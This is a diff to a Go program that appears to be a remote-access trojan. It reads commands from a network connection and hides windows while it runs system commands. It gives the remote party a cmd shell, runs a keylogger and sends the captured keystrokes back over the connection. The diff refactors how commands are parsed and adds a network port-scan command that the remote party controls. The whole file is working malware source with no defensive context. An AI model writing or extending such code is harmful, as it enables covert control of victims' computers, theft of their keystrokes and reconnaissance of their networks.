@@ -3,6 +3,7 @@ package main
 import (
 	"KBHook"
 	"fmt"
+	"goScan"
 	"io"
 	"log"
 	"net"
@@ -46,10 +47,12 @@ func main(){
 		// Transform bytes message to string cmd
 		receivedCmd := string(buf[:n])
 		receivedCmd = strings.TrimSuffix(receivedCmd, "\n")
-		fmt.Println(receivedCmd)
+		fmt.Println(strings.Split(receivedCmd," "))
+		splitedCmd := strings.Split(receivedCmd," ")
+		firstCmd := splitedCmd[0]
 
 		// Simple route cmd call. Output redirect to conn stream
-		if receivedCmd == "route" {
+		if firstCmd == "route" {
 			cmdInstance := exec.Command(cmdPath, "/q", "/c", "route", "print")
 
 			// Set-up io streams to conn. Set option to hide windows when calling system command
@@ -61,7 +64,7 @@ func main(){
 		}
 
 		// Simple systeminfo call. Output redirect to conn stream
-		if receivedCmd == "systeminfo" {
+		if firstCmd == "systeminfo" {
 			cmdInstance := exec.Command(cmdPath, "/q", "/c", "systeminfo")
 
 			// Set-up o streams to conn. Set option to hide windows when calling system command
@@ -73,7 +76,7 @@ func main(){
 		}
 
 		// Call system shell. IO redirect to conn steams
-		if receivedCmd == "shell" {
+		if firstCmd == "shell" {
 			cmdInstance := exec.Command(cmdPath)
 
 			// Set-up o streams to conn. Set option to hide windows when calling system command
@@ -86,24 +89,28 @@ func main(){
 		}
 
 		// Launch goroutine which start the keylogger
-		if receivedCmd == "startLog" {
+		if firstCmd == "startLog" {
 			go KBHook.StartKBHook(strChanKeyLogManager)
 		}
 
 		// Send stop string cmd to keylogger channel. It stop the keylogger
-		if receivedCmd == "stopLog" {
+		if firstCmd == "stopLog" {
 			strChanKeyLogManager <- "stopLog"
 		}
 
 		// Send log string cmd to keylogger channel. it prints the logs to the conn stream
-		if receivedCmd == "getLog" {
+		if firstCmd == "getLog" {
 			(strChanKeyLogManager) <- "getLog"
 			logRsl := <- (strChanKeyLogManager)
 			fmt.Fprintln(conn, logRsl)
 		}
 
+		if firstCmd == "scan"{
+			goScan.Scan(conn,splitedCmd[1],"tcp")
+		}
+
 		// Close the client
-		if receivedCmd == "bye" {
+		if firstCmd == "bye" {
 			close(strChanKeyLogManager)
 			conn.Close()
 			return
